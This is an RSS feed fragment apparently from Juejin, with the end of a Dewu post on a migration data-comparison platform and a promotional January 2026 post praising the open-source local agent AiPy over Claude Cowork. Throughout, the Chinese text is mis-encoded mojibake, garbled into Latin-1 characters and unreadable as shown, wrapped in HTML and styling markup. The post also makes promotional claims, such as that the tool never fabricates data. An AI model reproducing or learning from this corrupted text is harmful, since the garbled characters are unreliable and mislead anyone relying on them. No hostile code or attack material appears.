<li>åŠ©åŠ›å¼•æ“å›¢é˜Ÿå®Œæˆ800+æ‰¹æ¬¡ä»»åŠ¡çš„å›å½’éªŒè¯ï¼Œç¡®ä¿æ¯ä¸€æ¬¡å¼•æ“å‘å¸ƒçš„å®‰å…¨åŠé«˜æ•ˆã€‚</li>
<li>åŠ©åŠ›SDKè¿ç§»å›¢é˜Ÿå®Œæˆ80%+åº”ç”¨çš„è¿ç§»ã€‚</li>
</ul>
<h2 data-id="heading-14">å…­ã€æœªæ¥æ¼”è¿›æ–¹å‘</h2>
<p>æ¥ä¸‹æ¥ï¼Œå¹³å°è®¡åˆ’åœ¨ä»¥ä¸‹æ–¹é¢æŒç»­æ”¹è¿›ï¼š</p>
<p><strong>æ™ºèƒ½åˆ†æå¼•æ“ï¼š</strong> é’ˆå¯¹Jsonå¤æ‚åµŒå¥—ç±»å‹çš„å­—æ®µæ¥å…¥å¤§æ¨¡å‹è¿›è¡Œæ•°æ®æ ¹å› åˆ†æï¼Œæ‰¾å‡ºä¸ä¸€è‡´å†…å®¹ã€‚</p>
<p><strong>æ¯”å¯¹ç­–ç•¥ä¼˜åŒ–ï¼š</strong> é’ˆå¯¹å¤§è¡¨è‡ªåŠ¨åˆ‡åˆ†è¿›è¡Œæ¯”å¯¹ï¼Œé™ä½æ¯”æ•°è¿‡ç¨‹å‡ºç°å› æ•°æ®é‡å¤§å¯¼è‡´å¼‚å¸¸ï¼Œè¿›ä¸€æ­¥æå‡æ¯”å¯¹æ•ˆç‡ã€‚</p>
<p><strong>é€šç”¨æ–¹æ¡ˆæ²‰æ·€ï¼š</strong> å°†å…¸å‹çš„æ¯”å¯¹åœºæ™¯å’Œè§£å†³æ–¹æ¡ˆèƒ½ç”¨åŒ–ï¼Œåº”ç”¨åˆ°æ›´å¤šåœºæ™¯åŠå›¢é˜Ÿä¸­å»ã€‚</p>
<h2 data-id="heading-15">ä¸ƒã€ç»“è¯­</h2>
<p>æ¯”æ•°å¹³å°æ˜¯å¾—ç‰©åœ¨è¿ç§»è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†åº”å¯¹æµ·é‡ä»»åŠ¡ã€å¤§æ•°æ®é‡ã€å­—æ®µå†…å®¹å¤æ‚å¤šæ ·ã€å¼‚å¸¸æ•°æ®éš¾å®šä½ç­‰æŒ‘æˆ˜ï¼Œç¡®ä¿ä¸šåŠ¡è¿ç§»åæ•°æ®å‡†ç¡®è€Œä¸“é—¨æä¾›çš„è§£å†³æ–¹æ¡ˆï¼Œæœªæ¥å®ƒä¸å•çº¯æ˜¯ä¸€ä¸ªæœåŠ¡è®¡ç®—è¿ç§»ã€å­˜å‚¨è¿ç§»ã€SDKè¿ç§»ã€Sparkç‰ˆæœ¬å‡çº§ç­‰éœ€è¦çš„æ•°æ®æ¯”å¯¹å·¥å…·ï¼Œè€Œæ˜¯æ¼”è¿›ä¸ºæ•°æ®å¹³å°ä¸­ä¸å¯æˆ–ç¼ºçš„åŸºç¡€è®¾æ–½ã€‚</p>
<h3 data-id="heading-16">å¾€æœŸå›é¡¾</h3>
<p>1.å¾—ç‰©Appæ™ºèƒ½å·¡æ£€æŠ€æœ¯çš„æ¢ç´¢ä¸å®è·µ</p>
<p>2.æ·±åº¦å®è·µï¼šå¾—ç‰©ç®—æ³•åŸŸå…¨æ™¯å¯è§‚æµ‹æ€§ä» 0 åˆ° 1 çš„æ¼”è¿›ä¹‹è·¯Â </p>
<p>3.å‰ç«¯å¹³å°å¤§ä»“åº”ç”¨ç¨³å®šæ€§æ²»ç†ä¹‹è·¯ï½œå¾—ç‰©æŠ€æœ¯</p>
<p>4.RocketMQé«˜æ€§èƒ½æ­ç§˜ï¼šæ‰¿è½½ä¸‡äº¿çº§æµé‡çš„æ¶æ„å¥¥ç§˜ï½œå¾—ç‰©æŠ€æœ¯</p>
<p>5.PAGåœ¨å¾—ç‰©ç¤¾åŒºSçº§æ´»åŠ¨çš„è½åœ°</p>
<h3 data-id="heading-17">æ–‡ /Galaxyå¹³å°</h3>
<p>å…³æ³¨å¾—ç‰©æŠ€æœ¯ï¼Œæ¯å‘¨æ›´æ–°æŠ€æœ¯å¹²è´§</p>
<p>è¦æ˜¯è§‰å¾—æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©çš„è¯ï¼Œæ¬¢è¿è¯„è®ºè½¬å‘ç‚¹èµï½</p>
<p>æœªç»å¾—ç‰©æŠ€æœ¯è®¸å¯ä¸¥ç¦è½¬è½½ï¼Œå¦åˆ™ä¾æ³•è¿½ç©¶æ³•å¾‹è´£ä»»ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½ çš„AI ç‰›é©¬å·²å°±ä½ï¼Œè§£æ”¾åŒæ‰‹ï¼]]></title>    <link>https://juejin.cn/post/7597650624636796928</link>    <guid>https://juejin.cn/post/7597650624636796928</guid>    <pubDate>2026-01-21T10:22:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597650624636796928" data-draft-id="7597623654056067087" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½ çš„AI ç‰›é©¬å·²å°±ä½ï¼Œè§£æ”¾åŒæ‰‹ï¼"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-21T10:22:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CUGGZ"/> <meta itemprop="url" content="https://juejin.cn/user/3544481220801815"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½ çš„AI ç‰›é©¬å·²å°±ä½ï¼Œè§£æ”¾åŒæ‰‹ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3544481220801815/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CUGGZ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T10:22:57.000Z" title="Wed Jan 21 2026 10:22:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿™ä¸¤å¤© AI åœˆéƒ½åœ¨ç–¯ä¼  Anthropic çš„æ–°åŠ¨ä½œï¼šClaude Coworkã€‚ä¸»æ‰“ä¸€ä¸ªâ€œAI æ›¿ä½ æ‰‹åŠ¨æ“ä½œç”µè„‘â€çš„æ¦‚å¿µã€‚æˆ‘çœ‹å®Œæ¼”ç¤ºè§†é¢‘ç¬¬ä¸€ååº”æ˜¯çœŸé¦™ï¼Œç¬¬äºŒååº”æ˜¯å‘Šè¾ã€‚</p>
<p>ä¸”ä¸è¯´å®ƒç›®å‰ä»…é™ macOSï¼Œå…‰æ˜¯é‚£ä¸ªé—¨æ§›å°±ç›´æ¥åŠé€€ï¼šå¿…é¡»æ˜¯é¡¶çº§ä¼šå‘˜ï¼Œæœˆè´¹é«˜è¾¾ 200 åˆ€ã€‚æ¢ç®—æˆäººæ°‘å¸ï¼Œæ¯ä¸ªæœˆå¾—æå¿« 1500 å—ã€‚è¯´å®è¯ï¼Œå°±æˆ‘è¿™ç‚¹å„¿ç‰›é©¬å·¥èµ„ï¼Œå…»æ´»è‡ªå·±éƒ½è´¹åŠ²ï¼Œå®åœ¨ä¾›ä¸èµ·ä¸€ä¸ªæ¯æœˆ 1500 å…ƒçš„æ•°å­—å¤§çˆ·ã€‚</p>
<p>å…¶å®ï¼Œæƒ³ä½“éªŒè¿™ç§â€œAI ç»™æˆ‘æ‰“å·¥â€çš„æ„Ÿè§‰ï¼ŒçœŸæ²¡å¿…è¦èˆè¿‘æ±‚è¿œã€‚æˆ‘æŠ˜è…¾äº†å‡ å¤©ä¸€ä¸ªå« AiPyï¼ˆçˆ±æ´¾ï¼‰ çš„å¼€æºé¡¹ç›®ï¼Œæ„Ÿå—åªæœ‰ä¸€å¥è¯ï¼šè¿™æ‰æ˜¯æ™®é€šèŒåœºäººèƒ½çœŸæ­£ç™½å«–ã€ä¸”æ•¢åœ¨æœ¬åœ°è·‘çš„â€œæ•°å­—ç‰›é©¬â€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a46bb07296fa4a24a49dd4a8fb2b0bf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=a8JtJW%2BRF1FBMN2Vmf%2B27npn9BM%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<blockquote>
<p>å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aipyaipy.com%2F" target="_blank" title="https://www.aipyaipy.com/" ref="nofollow noopener noreferrer">www.aipyaipy.com/</a></p>
<p>Githubï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fknownsec%2Faipyapp" target="_blank" title="https://github.com/knownsec/aipyapp" ref="nofollow noopener noreferrer">github.com/knownsec/aiâ€¦</a></p>
</blockquote>
<h2 data-id="heading-0">å®ƒæ˜¯ AIï¼Œä½†å®ƒçœŸçš„â€œé•¿äº†æ‰‹â€</h2>
<p>å¾ˆå¤šäººæŠŠ AI å½“æˆèŠå¤©æœºå™¨äººï¼Œä½† AiPy çš„é€»è¾‘æ˜¯ Python-Useã€‚</p>
<p>ç®€å•æ¥è¯´å°±æ˜¯ï¼šå®ƒä¸åªæ˜¯æœ‰ä¸ªèƒ½æ€è€ƒçš„å¤§è„‘ï¼Œè¿˜é•¿äº†ä¸€åŒèƒ½æ“ä½œä½ ç”µè„‘çš„â€œæ‰‹â€ã€‚å®ƒä¸æ˜¯é‚£ç§åªä¼šè·Ÿä½ ç©æ–‡å­—æ¸¸æˆçš„ AIï¼Œè€Œæ˜¯èƒ½ç›´æ¥æ ¹æ®ä½ çš„éœ€æ±‚ï¼Œåœ¨åå°è‡ªåŠ¨ç”Ÿæˆ Python ä»£ç ã€è¿è¡Œç¨‹åºã€ç”šè‡³è‡ªå·±ç»™è‡ªå·±æ‰¾ Bug è°ƒä¼˜ã€‚</p>
<p>æœ€èµçš„æ˜¯ï¼Œå®ƒæŠŠä»£ç è¿‡ç¨‹å…¨éšè—äº†ã€‚ä½ ä¸éœ€è¦æ‡‚ Pythonï¼Œåªéœ€è¦è¯´äººè¯ã€‚å®ƒå°±åœ¨ä½ æœ¬åœ°ç³»ç»Ÿé‡ŒåŠ¨æ€åœ°â€œåˆ¶é€ â€å·¥å…·æ¥è§£å†³é—®é¢˜ã€‚è¿™ç§ â€œä½ æéœ€æ±‚ï¼Œå®ƒæµæ±—â€ çš„é—­ç¯æ–¹æ¡ˆï¼Œæ¯”é‚£äº›åªä¼šåå­—çš„ AI å¼ºå¤ªå¤šäº†ã€‚</p>
<h2 data-id="heading-1">æ¯”å›½å¤–å¤§ç‰Œæ›´æ¥åœ°æ°”</h2>
<ul>
<li>çœŸÂ·ç™½å«–å‹å¥½ï¼š å¼€æºé¡¹ç›®ï¼Œæ³¨å†Œå°±é€æµ·é‡ Tokenï¼Œä¸åƒæŸ Claude è¿˜æ²¡ç”¨å°±å…ˆå‰²ä½ ä¸€åˆ€ã€‚</li>
<li>ä¸æŒ‘è®¾å¤‡ï¼š Windowsã€Macã€Linux éƒ½èƒ½è·‘ï¼Œä¸ç”¨ä¸ºäº†ç”¨ AI ä¸“é—¨å»é…ä¸ªè‹¹æœç”µè„‘ã€‚</li>
<li>éšç§å®‰å…¨ï¼š å®ƒæ˜¯æœ¬åœ°è¿è¡Œï¼Œæ•°æ®ä¸å‡ºä½ çš„æœºå™¨ã€‚å¤„ç†å·¥èµ„å•ã€å…¬å¸ç§å¯†æ–‡æ¡£æ—¶ï¼Œä¸ç”¨æ‹…å¿ƒè¢«äº‘ç«¯â€œå·çª¥â€ã€‚</li>
<li>æ–­ç½‘ä¹Ÿèƒ½å¹²æ´»ï¼š æ”¯æŒè°ƒç”¨æœ¬åœ°ç§æœ‰æ¨¡å‹ï¼Œå°±ç®—ä½ å•ä½æ˜¯æ–­ç½‘çš„å†…ç½‘ç¯å¢ƒï¼Œå®ƒä¹Ÿèƒ½ç…§æ ·å½“ç‰›é©¬ã€‚</li>
</ul>
<h2 data-id="heading-2">å®æµ‹ï¼šæ•´ç† 50G æ··ä¹±å›¾ç‰‡ï¼Œå®ƒèƒ½å¸®æˆ‘çœä¸‹å‡ ä¸ªå°æ—¶ï¼Ÿ</h2>
<p>ä¸ºäº†æµ‹æµ‹å®ƒåˆ°åº•è¡Œä¸è¡Œï¼Œæˆ‘ç»™è‡ªå·±å‡ºäº†ä¸ªå¹³æ—¶æœ€å¤´ç–¼çš„éš¾é¢˜ï¼šæ•´ç†æ¡Œé¢ä¸Šä¸€ä¸ª 50G çš„å·¨å‹æ–‡ä»¶å¤¹ã€‚</p>
<p>é‡Œé¢å¡æ»¡äº†è¿™å‡ å¹´çš„ç…§ç‰‡ï¼Œç›¸ä¼¼çš„ã€é‡å¤çš„ä¸€å¤§å †ã€‚å¦‚æœäººå·¥ç­›é€‰ï¼Œæˆ‘ä¼°è®¡å¾—çœ‹åˆ°çœ¼çã€‚æˆ‘ç›´æ¥æŠŠè¿™ä¸ªæ–‡ä»¶å¤¹ä¸¢ç»™æˆ‘çš„â€œå°ç‰›é©¬â€ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f2a511662584197a51220a758ea50bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=OVvHXzdskpUA3MJ99cLrUWiU8b8%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<h3 data-id="heading-3">ä»–çš„æ‰“å·¥è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š</h3>
<ol>
<li>è‡ªåŠ¨æ‹†è§£ï¼š å®ƒç«‹åˆ»åˆ†æå‡ºéœ€è¦å…ˆæ‰«ææ–‡ä»¶å¤¹ã€è®¡ç®—å›¾ç‰‡å“ˆå¸Œå€¼ã€å¯¹æ¯”ç›¸ä¼¼åº¦ã€‚</li>
<li>ç¡¬æ ¸æ‰§è¡Œï¼š å’”å’”å‡ ç§’é’Ÿï¼Œå®ƒè‡ªå·±å†™äº†ä¸€ä¸ª Python è„šæœ¬å¹¶å¼€å§‹åœ¨åå°è¿è¡Œã€‚</li>
<li>äº¤ä»˜æ¸…å•ï¼š æ•´ä¸ªè¿‡ç¨‹è·‘äº† 12 åˆ†é’Ÿã€‚è™½ç„¶ä¸ç®—ç§’å¼€ï¼Œä½†å¯¹æ¯”æˆ‘äººå·¥ç­›é€‰å‡ ä¸ªå°æ—¶çš„å·¥ä½œé‡ï¼Œè¿™ç®€ç›´æ˜¯ç¥é€Ÿã€‚</li>
</ol>
<p>æœ€ç»ˆï¼Œå®ƒç»™æˆ‘åå‡ºäº†ä¸€ä»½ã€Šå¯åˆ é™¤ç…§ç‰‡åå•ã€‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/516da6101c3a4acdb89afb8573c63105~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=W1Y4hJOf3WMeAQI4X0eq0IriKnQ%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p>æˆ‘éšæ‰‹æŠ½æ£€äº†å‡ ä¸ªï¼Œå‡†ç¡®åº¦è¶…è¿‡ 80%ï¼å‰©ä¸‹çš„ 20% ä¸»è¦æ˜¯å› ä¸ºå®¡ç¾ä¸»è§‚åˆ¤æ–­ï¼ˆæ¯”å¦‚ä¸¤å¼ è¿æ‹æˆ‘æ›´å–œæ¬¢å“ªä¸€å¼ ï¼‰ï¼Œä½†åœ¨è¿‡æ»¤é‡å¤å’Œæ¨¡ç³Šç…§ç‰‡ä¸Šï¼Œå®ƒè¡¨ç°å¾—æå…¶ç¡¬æ ¸ã€‚</p>
<p>æˆ‘èƒ½çœ‹åˆ°å®ƒåœ¨â€œå¹²æ´»â€ï¼Œä½†æˆ‘ä¸éœ€è¦å‚ä¸ã€‚è¿™ç§â€œä½ å¼ å˜´ï¼Œå®ƒæµæ±—â€çš„æ„Ÿè§‰ï¼Œç¡®å®ä¸Šå¤´ã€‚</p>
<h2 data-id="heading-4">å†æ¥ç”Ÿæˆä¸€ä»½ä¸“ä¸šçš„é»„é‡‘è¡Œæƒ…æŠ¥å‘Š</h2>
<p>æœ€è¿‘é»„é‡‘è¡Œæƒ…æ³¢åŠ¨å¤§ï¼Œæˆ‘æƒ³åšä¸ªæ·±åº¦äº†è§£ã€‚æ™®é€šçš„ AI å¾€å¾€ä¼šç»™ä½ ä¸€å †â€œå¹»è§‰â€æ•°æ®ï¼ˆçç¼–ï¼‰ï¼Œä½† AiPy å¾ˆæ¸…é†’ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/567f89fb7f39460f9665ff3ea4e6bc95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=Oh5Jgiv55kQSO9kMzYL2aiRktdg%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p>å®ƒå…ˆå†™äº†ä¸ªè§„åˆ’ï¼š å…ˆè°ƒç”¨å…è´¹ API è·å–å®æ—¶å’Œå†å²æ•°æ® -&gt; è¿›è¡Œæ•°æ®æ¸…æ´— -&gt; ç»˜åˆ¶å›¾è¡¨ -&gt; æ’°å†™åˆ†æã€‚</p>
<p>æœ€ç»ˆï¼Œå®ƒä¸ä»…æ²¡çç¼–ï¼Œè¿˜ç”¨å¯è§†åŒ–çš„å½¢å¼ç»™æˆ‘ç”Ÿæˆäº†ä¸€ä»½éå¸¸ä¸“ä¸šçš„æŠ¥å‘Šã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8caf5f1156074e0088bf3eb5a6683e49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=9Fvd1g%2FcIGWD1atRaTLWDqLwv8w%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68eff17c7c7b42b995fad29b89cddcf3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=XVEKJOIyhS8CxXszkrjlhfJCAms%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p>è¿™ç§ â€œè‡ªè¡Œ Debug + æ‰§è¡Œåé¦ˆå¾ªç¯â€ çš„èƒ½åŠ›ï¼Œè®©å®ƒè¶Šç”¨è¶Šèªæ˜ã€‚è¿™ç§æ„Ÿè§‰ä¸åƒæ˜¯åœ¨ç”¨å·¥å…·ï¼Œæ›´åƒæ˜¯åœ¨å¸¦ä¸€ä¸ªæ‰‹è„šåˆ©ç´¢çš„å®ä¹ ç”Ÿã€‚</p>
<h2 data-id="heading-5">è°æœ€éœ€è¦è¿™ä¸ªâ€œæ•°å­—ç‰›é©¬â€ï¼Ÿ</h2>
<p>AiPy å®˜æ–¹ç”šè‡³æäº†ä¸€ä¸ªâ€œæ™ºèƒ½ä½“é›†å¸‚â€ï¼Œé‡Œé¢æœ‰ä¸€å †ç°æˆçš„å·¥ç§ä¾›ä½ æŒ‘é€‰ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3df89443ccf5453e9204f9f9050dc11d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=pAE3xT%2F%2FJIELmCYuDIilN6rOj6g%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p>æˆ‘è§‰å¾—è¿™å‡ ç±»äººä¸€å®šè¦è¯•ï¼š</p>
<ul>
<li>æ‚äº‹ç¼ èº«çš„æ‰“å·¥äººï¼š å¤©å¤©å¤„ç†å¤§é‡æ–‡ä»¶ã€é‡å‘½åã€æ•´ç†æ•°æ®çš„ã€‚</li>
<li>å¼€å‘è€…ï¼š æƒ³å¿«é€Ÿæä¸ªæœ¬åœ° AI å·¥å…·ï¼Œåˆä¸æƒ³æŠ˜è…¾ç¯å¢ƒçš„ã€‚</li>
<li>éšç§æ•æ„Ÿç¾¤ä½“ï¼š å¯¹æ•°æ®å®‰å…¨è¦æ±‚æé«˜ï¼Œæƒ³åœ¨å†…ç½‘è·‘ AI çš„ã€‚</li>
<li>æƒ³çœé’±çš„ç¾Šæ¯›å…šï¼š ä¸æƒ³ç»™ç¡…è°·å¤§å‚äº¤æ™ºå•†ç¨ï¼Œè¿½æ±‚æè‡´æ€§ä»·æ¯”çš„ã€‚</li>
</ul>
<h2 data-id="heading-6">å†™åœ¨æœ€å</h2>
<p>æœ‰æ—¶å€™ï¼ŒAI çš„ä»·å€¼ä¸åœ¨äºâ€œå®ƒèƒ½å†™å¤šç¾çš„è¯—â€ï¼Œè€Œåœ¨äºï¼šå®ƒåˆ°åº•èƒ½æ›¿ä½ å°‘å¹²å¤šå°‘è„æ´»ç´¯æ´»ã€‚</p>
<p>å¦‚æœä½ åŒå€¦äº†é‚£ç§åªä¼šâ€œçº¸ä¸Šè°ˆå…µâ€çš„å¯¹è¯ AIï¼Œæƒ³çœŸæ­£æ„Ÿå—ä¸€ä¸‹å…¨è‡ªåŠ¨å¤„ç†æ–‡ä»¶ã€æ“ä½œè½¯ä»¶çš„çˆ½æ„Ÿï¼ŒAiPy ç»å¯¹å€¼å¾—ä¸€è¯•ã€‚å®ƒå¯èƒ½æ²¡ 200 åˆ€çš„ Claude åæ°”å¤§ï¼Œä½†å®ƒèƒœåœ¨ï¼šæ¥åœ°æ°”ã€çœŸå¹²æ´»ã€è¿˜å…è´¹ã€‚</p>
<hr/>
